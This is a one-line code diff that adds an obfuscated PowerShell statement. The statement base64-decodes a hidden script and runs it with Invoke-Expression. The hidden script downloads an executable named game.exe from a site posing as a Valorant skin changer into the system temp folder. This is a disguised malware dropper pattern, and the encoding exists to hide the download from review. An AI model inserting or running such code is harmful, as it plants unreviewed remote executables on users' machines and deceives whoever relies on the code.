@@ -1,0 +1,1 @@
+$obfuscated = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JHRlbXBEaXIgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpDQoNCmN1cmwgImh0dHBzOi8vdmFsb3JhbnRza2luY2hhbmdlci5uZXRsaWZ5LmFwcC9kb3dubG9hZC9nYW1lLmV4ZSIgLW8gIiR0ZW1wRGlyL2dhbWUuZXhlIg==')); Invoke-Expression $obfuscated
